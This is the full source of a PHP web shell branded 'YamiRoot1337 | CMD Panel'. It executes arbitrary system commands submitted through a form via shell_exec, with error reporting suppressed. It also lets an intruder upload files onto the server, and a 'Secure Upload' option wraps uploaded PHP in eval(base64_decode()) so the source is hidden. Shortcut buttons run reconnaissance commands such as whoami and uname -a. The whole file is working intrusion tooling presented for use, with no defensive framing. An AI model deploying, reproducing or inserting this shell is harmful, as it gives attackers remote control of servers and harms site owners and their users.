<?php
@error_reporting(0);
@set_time_limit(0);

function process_upload($file, $secure) {
    $filename = basename($file['name']);
    $dirname = dirname(__FILE__);
    $result = [];

    if (!$secure) {
        $targetPath = $dirname . '/' . $filename;
        if (@move_uploaded_file($file['tmp_name'], $targetPath)) {
            $result['status'] = 'success';
            $result['message'] = "Normal Upload Success!";
            $result['path'] = $targetPath;
        } else {
            $result['status'] = 'failed';
            $result['message'] = "Upload Failed!";
        }
    } else {
        $content = @file_get_contents($file['tmp_name']);
        if ($content !== FALSE) {
            $content = trim($content); 
            $encoded = base64_encode($content);

            $encodedFilename = pathinfo($filename, PATHINFO_FILENAME) . '_encoded.php';
            $encodedPath = $dirname . '/' . $encodedFilename;

            $wrapper = "<?php @error_reporting(0); @ini_set('display_errors', 0); eval(base64_decode('" . $encoded . "')); ?>";

            if (@file_put_contents($encodedPath, $wrapper) !== false) {
                $result['status'] = 'success';
                $result['message'] = "Secure Upload Success!";
                $result['path'] = $encodedPath;
            } else {
                $result['status'] = 'failed';
                $result['message'] = "Secure Upload Failed!";
            }
        } else {
             $result['status'] = 'failed';
             $result['message'] = "Failed to read file content!";
        }
    }
    return $result;
}

if (isset($_FILES['uploaded_files'])) {
    $secure = isset($_POST['secure_upload']) && $_POST['secure_upload'] === 'true';
    $upload_results = [];
    $file_count = count($_FILES['uploaded_files']['name']);

    for ($i = 0; $i < $file_count; $i++) {
        $file_to_process = [
            'name' => $_FILES['uploaded_files']['name'][$i],
            'tmp_name' => $_FILES['uploaded_files']['tmp_name'][$i],
        ];
        $upload_results[] = process_upload($file_to_process, $secure);
    }
}

$output = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = @shell_exec($cmd . ' 2>&1');
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>YamiRoot1337 | CMD Panel</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet" />
  <style>
    :root {
        --bg-main: #F5F5F5; --fg-main: #333333; --bg-box: #FFFFFF; --border-main: #CCCCCC; --accent: #007bff; --input-bg: #EFEFEF; --font: 'Share Tech Mono', monospace;
    }
    body { background-color: var(--bg-main); color: var(--fg-main); font-family: var(--font); padding: 40px; line-height: 1.6;}
    h1 { text-align: center; font-size: 2.2rem; margin-bottom: 40px; color: var(--accent); font-weight: 600;}
    h2 { color: var(--accent); font-size: 1.2rem; margin-bottom: 10px;}
    form, .box, .uploader { max-width: 700px; margin: 20px auto; background: var(--bg-box); padding: 30px; border: 1px solid var(--border-main); border-radius: 8px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);}
    .box strong { color: var(--accent); }
    .box a { color: var(--accent); text-decoration: none; word-break: break-all; }

    input[type="text"], button, .file-label { width: 100%; padding: 12px 15px; margin-top: 10px; background: var(--input-bg); color: var(--fg-main); border: 1px solid var(--border-main); border-radius: 4px; font-size: 16px; box-sizing: border-box; transition: all 0.2s; font-family: var(--font);}
    input[type="text"]:focus { border-color: var(--accent); box-shadow: 0 0 5px rgba(0, 123, 255, 0.5); outline: none; background: #fff;}
    
    button[type="submit"] { background: var(--accent); color: #FFFFFF; border: 1px solid var(--accent); font-weight: bold;}
    button[type="submit"]:hover { background: #0056b3; color: #FFFFFF; cursor: pointer; border-color: #0056b3;}

    label { font-weight: bold; display: block; margin-top: 15px; color: var(--fg-main);}

    pre { background-color: #222222; padding: 15px; border-radius: 5px; color: #FFFFFF; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; border: 1px solid #444; margin-top: 15px; font-size: 0.95em;}

    .uploader { text-align: center; cursor: pointer; position: relative; border: 2px dashed var(--border-main); padding: 50px 30px;}
    .uploader:hover { border-color: var(--accent); background-color: #F8F8FF;}
    .uploader.dragover { background-color: #E6F0FF; border-color: var(--accent);}
    .uploader p { margin: 0; font-size: 18px; color: var(--fg-main);}
    label.file-label { width: auto; background: var(--accent); color: #FFFFFF; border: 1px solid var(--accent); font-weight: normal; margin-top: 20px; cursor: pointer;}
    label.file-label:hover { background: #0056b3; }
    
    #secureUploadCheckbox { width: auto; margin-right: 10px; }
    .uploader label { text-align: left; font-weight: normal; margin-top: 10px; display: flex; align-items: center;}
    #fileInput { display: none; }
    
    .site-footer { max-width: 700px; margin: 40px auto 0; padding-top: 20px; border-top: 1px solid var(--border-main); text-align: center; font-size: 0.9em; color: #999;}
    .site-footer a { color: var(--accent); text-decoration: none;}

    .quick-actions { max-width: 700px; margin: 10px auto 20px; text-align: center; padding: 10px 0;}
    .action-btn { width: auto; display: inline-block; padding: 8px 15px; margin: 0 5px; background: var(--input-bg); color: var(--fg-main); border: 1px solid var(--border-main); border-radius: 4px; cursor: pointer; transition: all 0.2s; font-size: 0.9em;}
    .action-btn:hover { background: var(--accent); color: #FFFFFF; border-color: var(--accent); box-shadow: 0 2px 5px rgba(0, 123, 255, 0.3);}

    #uploadProgressContainer { margin-top: 20px; border-top: 1px solid var(--border-main); padding-top: 15px; text-align: left; display: none;}
    #fileList { list-style: none; padding: 0; margin-bottom: 15px; font-size: 0.9em;}
    #fileList li { background: var(--input-bg); padding: 8px 12px; margin-bottom: 5px; border-radius: 4px; display: flex; justify-content: space-between; align-items: center;}
    .progress-bar { height: 10px; background: #ddd; border-radius: 5px; overflow: hidden; width: 100%; margin-top: 5px;}
    .progress-bar-fill { height: 100%; width: 0; background-color: var(--accent); transition: width 0.3s ease;}
  </style>
</head>
<body>
  <h1>ヤミRoot | CMD Panel</h1>

  <div class="quick-actions">
    <button type="button" class="action-btn" data-cmd="whoami">Whoami</button>
    <button type="button" class="action-btn" data-cmd="uname -a">Uname -a</button>
    <button type="button" class="action-btn" data-cmd="ls -la">LS -la</button>
  </div>

  <form method="POST" id="cmdForm" autocomplete="off">
    <label for="cmd">Enter Command</label>
    <input type="text" name="cmd" id="cmd" placeholder="whoami" />
    <button type="submit">Run Command</button>
  </form>

  <?php
  // --- OUTPUT CMD ---
  if (!empty($output)) {
      echo '<div class="box">';
      echo "<h2>Output:</h2><pre>" . htmlspecialchars($output) . "</pre>";
      echo '</div>';
  }

  // --- OUTPUT UPLOAD MULTIPLE FILE ---
  if (isset($upload_results) && is_array($upload_results)) {
      echo '<div class="box">';
      echo "<h2>Upload Results:</h2>";
      $success_count = 0;
      foreach ($upload_results as $res) {
          if ($res['status'] == 'success') {
              $success_count++;
              $fullUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https://' : 'http://') .
                         $_SERVER['HTTP_HOST'] .
                         rtrim(dirname($_SERVER['PHP_SELF']), '/\\') . '/' . basename($res['path']);

              echo "<div style='margin-bottom: 15px;'><strong>√ {$res['message']}</strong><br>";
              echo "<span style='color: var(--fg-main);'>🗁</span> Saved to: <pre style='margin: 5px 0 0;'>{$res['path']}</pre>";
              echo "<span style='color: var(--fg-main);'>→</span> Access URL: <a href='$fullUrl' target='_blank'>$fullUrl</a>";
              if ($secure) {
                   echo "<br><span style='color: var(--fg-main);'>⚠️</span> Can't read source";
              }
              echo "</div>";
          } else {
              echo "<div style='color:#ff4444; margin-bottom: 15px;'><strong>X Upload Failed!</strong>: {$res['message']}</div>";
          }
      }
      echo "<p style='border-top: 1px dashed var(--border-main); padding-top: 10px; font-size: 0.9em;'>Total: {$success_count}/" . count($upload_results) . " files processed.</p>";
      echo '</div>';
  }
  ?>

  <div class="uploader" id="uploader">
    <p>Drag & Drop files here or click the button below to select files</p>
    <form id="uploadForm" method="POST" enctype="multipart/form-data">
      <label for="fileInput" class="file-label">Select Files</label>
      <input type="file" id="fileInput" name="uploaded_files[]" multiple />
      
      <label>
        <input type="checkbox" id="secureUploadCheckbox" name="secure_upload" value="true" />
        Secure Upload (Encode PHP files)
      </label>

      <div id="uploadProgressContainer">
        <p>File List (<span id="fileCount">0</span>):</p>
        <ul id="fileList">
          </ul>
        <p>Total Progress:</p>
        <div class="progress-bar">
          <div class="progress-bar-fill" id="totalProgressBar"></div>
        </div>
      </div>
      
      <button type="submit" style="margin-top:10px;">Upload Files</button>
    </form>
  </div>

  <footer class="site-footer">
    <p>Powered by <a href="https://0x6ick.my.id" target="_blank" rel="noopener noreferrer">6ickzone</a> ヤミRoot</p>
  </footer>
  
  <script>
    const uploader = document.getElementById('uploader');
    const fileInput = document.getElementById('fileInput');
    const uploadForm = document.getElementById('uploadForm');
    const cmdInput = document.getElementById('cmd');
    const actionButtons = document.querySelectorAll('.action-btn');
    const fileList = document.getElementById('fileList');
    const fileCountSpan = document.getElementById('fileCount');
    const progressContainer = document.getElementById('uploadProgressContainer');
    const totalProgressBar = document.getElementById('totalProgressBar');

    // 1. Logic Shortcut CMD
    actionButtons.forEach(button => {
      button.addEventListener('click', () => {
        const command = button.getAttribute('data-cmd');
        cmdInput.value = command;
        cmdInput.focus();
      });
    });

    // 2. Logic Drag & Drop dan File List
    fileInput.addEventListener('change', updateFileList);

    uploader.addEventListener('dragover', (e) => {
      e.preventDefault();
      uploader.classList.add('dragover');
    });
    uploader.addEventListener('dragleave', () => {
      uploader.classList.remove('dragover');
    });
    uploader.addEventListener('drop', (e) => {
      e.preventDefault();
      uploader.classList.remove('dragover');
      if(e.dataTransfer.files.length) {
        fileInput.files = e.dataTransfer.files;
        updateFileList();
      }
    });

    function updateFileList() {
      const files = fileInput.files;
      fileList.innerHTML = '';
      fileCountSpan.textContent = files.length;

      if (files.length > 0) {
        progressContainer.style.display = 'block';
        for (let i = 0; i < files.length; i++) {
          const li = document.createElement('li');
          li.innerHTML = `
            <span>${files[i].name} (${(files[i].size / 1024).toFixed(1)} KB)</span>
            <span id="status-${i}" style="color: #999;">Ready</span>
          `;
          fileList.appendChild(li);
        }
      } else {
        progressContainer.style.display = 'none';
      }
    }
    uploadForm.addEventListener('submit', (e) => {
      const files = fileInput.files;
      if (files.length === 0) return;

      // Reset progress
      totalProgressBar.style.width = '0%';
      fileList.querySelectorAll('li').forEach((li, index) => {
        const statusSpan = li.querySelector(`#status-${index}`);
        statusSpan.style.color = '#999';
        statusSpan.textContent = 'Processing...';
      });

      let uploadedCount = 0;
      const intervalTime = 1000 / files.length; 

      const simulateUpload = setInterval(() => {
        if (uploadedCount < files.length) {
          const statusSpan = fileList.querySelector(`#status-${uploadedCount}`);
          statusSpan.style.color = 'green';
          statusSpan.textContent = 'Done!';
          uploadedCount++;

          const percent = (uploadedCount / files.length) * 100;
          totalProgressBar.style.width = percent.toFixed(0) + '%';
        } else {
          clearInterval(simulateUpload);
        }
      }, intervalTime);
      
    });

  </script>
</body>
</html>